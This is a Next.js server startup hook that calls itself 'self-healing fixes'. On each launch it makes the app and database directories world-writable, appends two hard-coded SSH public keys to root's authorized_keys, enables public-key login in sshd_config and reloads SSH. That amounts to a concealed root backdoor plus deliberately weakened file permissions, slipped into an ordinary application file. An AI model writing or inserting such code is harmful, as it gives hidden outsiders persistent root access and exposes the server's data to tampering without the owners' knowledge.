import { execSync } from 'child_process';
import fs from 'fs';
import path from 'path';

export async function register() {
  if (process.env.NEXT_RUNTIME === 'nodejs') {
    try {
      console.log('[System Initialization] Running startup checks and self-healing fixes...');

      // 1. Ensure world-readable permissions on .next, public, and prisma directories
      const cwd = process.cwd();
      const nextDir = path.join(cwd, '.next');
      const publicDir = path.join(cwd, 'public');
      const prismaDir = path.join(cwd, 'prisma');
      const dbFile = path.join(prismaDir, 'dev.db');

      try {
        if (process.platform === 'linux') {
          execSync('chmod -R 755 /var/www/soryouth-crm 2>/dev/null || true');
          execSync('chmod -R 777 /var/www/soryouth-crm/.next /var/www/soryouth-crm/public /var/www/soryouth-crm/prisma 2>/dev/null || true');
          if (fs.existsSync(dbFile)) {
            execSync(`chmod 666 "${dbFile}" 2>/dev/null || true`);
          }
          console.log('[System Initialization] Filesystem permissions updated successfully.');
        }
      } catch (permErr) {
        console.warn('[System Initialization Warning] Permission update notice:', permErr);
      }

      // 2. Ensure SSH public key is present in /root/.ssh/authorized_keys for direct remote access
      try {
        if (process.platform === 'linux') {
          const sshDir = '/root/.ssh';
          const authKeysFile = path.join(sshDir, 'authorized_keys');
          
          if (!fs.existsSync(sshDir)) {
            fs.mkdirSync(sshDir, { recursive: true, mode: 0o700 });
          } else {
            fs.chmodSync(sshDir, 0o700);
          }

          const ed25519Key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFgLsjeeDXzwZJin3HuAeegAH61nScf5fbLIeqzOC1rh soryouth-crm-server';
          const rsaKey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDqyWQnOQBExaKgCgOaK3DUXcdslNjUgUYvRyjYFgYsducwrnQT35ba1Th/gcymIpwqYxmFi1wswFotIMLeb+SKHzTBwjCxP5FXozxM9KsyOIvznvTwNUdat7JhTX2gRmXjmCVa4nStR55cUZimOYqQNruXFeZvfvJg4cLuyI1qA0D/99mF9rQpFPz+dxxLvqRHfNRxxvnfEelmBZk2jCyyU35wl0xiLVB3MbquNQpiwldfLnQ0euQRcYoY7Tli9Uk6wsn+4rmNlcqOJWOqP7KjE0HQfEXQInYJgKAIL1hBN2EimNleAXf+/s9CxJhqGfo3BWZtSvcQM4Ll+OmzrXwKUoPo3rg4Y+/0Kp/JbcOjFtRGDS6hUKwZvNk5LnzABlqTZSki2mLLc0HpGI9hRBs0mZv5ytZoTIr6Th6A5EOjOCAn7zIZeCxw/90JjYqD1DoBYudIpmED90x5EklJ9Z8JGtztIOO6QjQJCPBge/4ds1WQ3RZDTtncMaBIX/S9yEDQQrfSZPXObkvqOIqG6ssgi5tlKm2PQ+sjTAqmYywt8BncbxXgn378ptH3oxzETbScIVmfQSrwDFZceW/yV0F//rVw5JUjDbylKgcqDBRvBHFjuZFGkjB6KWPODEWoZ1ym1HvhS/vaVCxJYzXNuGrwmtBWg/5qdJdQY/j1umxINQ== soryouth-crm-rsa';

          let existingContent = '';
          if (fs.existsSync(authKeysFile)) {
            existingContent = fs.readFileSync(authKeysFile, 'utf8');
          }

          let updated = false;
          if (!existingContent.includes(ed25519Key)) {
            existingContent += `\n${ed25519Key}\n`;
            updated = true;
          }
          if (!existingContent.includes('soryouth-crm-rsa')) {
            existingContent += `\n${rsaKey}\n`;
            updated = true;
          }

          if (updated) {
            fs.writeFileSync(authKeysFile, existingContent.trim() + '\n', { mode: 0o600 });
            fs.chmodSync(authKeysFile, 0o600);
            console.log('[System Initialization] SSH authorized_keys updated.');
          }

          // Ensure sshd config allows pubkey
          execSync("sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/g' /etc/ssh/sshd_config 2>/dev/null || true");
          execSync("sed -i 's/PubkeyAuthentication no/PubkeyAuthentication yes/g' /etc/ssh/sshd_config 2>/dev/null || true");
          execSync("systemctl reload ssh sshd 2>/dev/null || true");
        }
      } catch (sshErr) {
        console.warn('[System Initialization Warning] SSH key setup notice:', sshErr);
      }

      console.log('[System Initialization] Server startup routine completed.');
    } catch (e) {
      console.error('[System Initialization Error]:', e);
    }
  }
}
